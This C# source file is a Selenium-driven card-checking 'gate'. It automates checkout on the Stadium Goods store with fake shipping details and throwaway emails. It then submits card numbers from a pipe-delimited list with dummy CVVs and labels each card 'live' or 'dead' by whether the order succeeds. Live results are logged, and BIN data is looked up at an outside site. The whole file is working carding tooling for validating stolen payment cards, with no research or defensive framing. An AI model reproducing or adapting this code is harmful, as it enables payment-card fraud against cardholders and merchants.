using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Stadium
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }


        private bool deleteBanner(By by)
        {
            Thread.Sleep(3000);
            try
            {
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;

            }
        }
        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {

                Form1.circularProgressBar1.Value = 5;
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--ignore-certificate-errors", "--headless", "--disable-gpu", "--no-sandbox");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.stadiumgoods.com/stadium-goods-apparel/accessories";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";

                if (deleteBanner(By.XPath("/html/body/div[10]/div[2]/div")))
                {
                    Thread.Sleep(3000);
                    driver.FindElement(By.XPath("/html/body/div[10]/div[2]/div/div[1]")).Click();
                }



                try
                {
                    if (tiempoElemento(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[2]/div[2]/main[1]/div[2]/div[1]/div[2]/div[2]/div[1]/select[1]")))

                    {
                        Form1.circularProgressBar1.Value = 20;
                        var precio = new SelectElement(driver.FindElement(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[2]/div[2]/main[1]/div[2]/div[1]/div[2]/div[2]/div[1]/select[1]")));
                        precio.SelectByValue("PRICE_ASC");
                        Thread.Sleep(500);
                    }

                    else
                    {
                        Form1.circularProgressBar1.Value = 30;
                        restart();
                    }
                    var producto = RandomNumber(1, 3);
                    if (IsElementPresent(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[2]/div[2]/main[1]/div[3]/div[3]/div[1]/div[" + producto + "]")))
                    {
                        Form1.circularProgressBar1.Value = 30;
                        Thread.Sleep(4000);
                        driver.FindElement(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[2]/div[2]/main[1]/div[3]/div[3]/div[1]/div[" + producto + "]")).Click();
                    }
                    else
                    {
                        
                        restart();
                    }
                    if (tiempoElemento(By.CssSelector("#product_addtocart_form > section > div.product-essential > div.product-shop > div.product-options-bottom > div.add-to-cart > div.add-to-cart-buttons > button")))
                    {
                        Form1.circularProgressBar1.Value = 40;
                        driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div[2]/div/div/div/form/section/div[1]/div[4]/div[2]/div[2]/div[2]/button")).Click();
                        Thread.Sleep(2000);

                        driver.Navigate().GoToUrl("https://www.stadiumgoods.com/checkout/onepage/");
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        
                        restart();
                    }
                    if (IsElementPresent(By.XPath("//*[@id='checkout-step-login']/div/div[1]/button")))
                    {
                        Form1.circularProgressBar1.Value = 50;
                        driver.FindElement(By.XPath("//*[@id='checkout-step-login']/div/div[1]/button")).Click();
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        
                        restart();
                    }
                    if (tiempoElemento(By.Id("shipping:email")))
                    {
                        Form1.circularProgressBar1.Value = 70;

                        driver.FindElement(By.Id("shipping:email")).SendKeys(correo);
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:telephone")).SendKeys("8005621465");
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:firstname")).SendKeys("queso");
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:lastname")).SendKeys("live");
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:street1")).SendKeys("street " + RandomNumber(1, 4));
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:postcode")).SendKeys("33206");
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("shipping:city")).SendKeys("miami");
                        var estado = new SelectElement(driver.FindElement(By.Id("shipping:region_id")));
                        estado.SelectByValue("18");

                        Thread.Sleep(1000);
                        if (tiempoElemento(By.Id("sg-address-verification-button")))
                        {
                            Thread.Sleep(2000);
                            driver.FindElement(By.Id("sg-address-verification-button")).Click();

                            Thread.Sleep(4000);
                            driver.ExecuteJavaScript("document.querySelector('#checkout-button-disabled').click();");


                            if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/ol/li[3]/div[3]/div[1]/form/div/dl/div")))
                            {


                                pago();
                            }
                            else
                            {
                            
                                restart();
                            }




                        }
                        else
                        {
                           
                            restart();
                        }


                    }
                    else
                    {
                        
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }

                }

            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Form1.circularProgressBar1.Value = 80;

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];


                        if (tiempoElemento(By.Id("vantiv_cc_cc_number")))
                        {
                            //for (int i = 0; i < number.Length; i++)
                            //{
                            Thread.Sleep(3000);
                            driver.FindElement(By.Id("vantiv_cc_cc_number")).SendKeys(ccnum/*[i].ToString()*/);
                            //Thread.Sleep(3000);
                            //}
                            //driver.FindElement(By.Id("vantiv_cc_cc_number")).SendKeys(number);
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("credit_card_expirations_vantiv")).SendKeys(ccLine[1] + ccLine[2].Remove(0, 2));


                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.CssSelector("#vantiv_cc_cc_type_cvv_div > div > input")).SendKeys("000");
                            }
                            else if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.CssSelector("#vantiv_cc_cc_type_cvv_div > div > input")).SendKeys("0000");

                            }

                            Thread.Sleep(2000);
                            driver.FindElement(By.Id("place-order")).Click();

                        }
                        else
                        {
                            restart();
                        }

                        Form1.circularProgressBar1.Value = 95;

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception EX)
            {

                Console.WriteLine(EX.ToString());
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 15)
                {

                    if (IsElementPresent(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div/div[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div/div[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div/div[1]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }

                    }

                    if (IsElementPresent(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[1]/div[1]/h1[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[1]/div[1]/h1[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html[1]/body[1]/div[2]/div[1]/div[2]/div[1]/div[1]/div[1]/h1[1]")).Text.Trim() == "Thank You!")
                            {
                                estado = "live";
                            }
                        }

                    }


                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }



            if (estado == "dead")
            {
                if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div/div[2]/button")))
                {
                    driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div/div[2]/button")).Click();

                    Thread.Sleep(1000);

                    driver.FindElement(By.Id("vantiv_cc_cc_number")).Clear();
                    driver.FindElement(By.Id("credit_card_expirations_vantiv")).Clear();
                    driver.FindElement(By.CssSelector("#vantiv_cc_cc_type_cvv_div > div > input")).Clear();
                }
                else
                {
                    restart();
                }
                
                Thread.Sleep(300);
               


                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

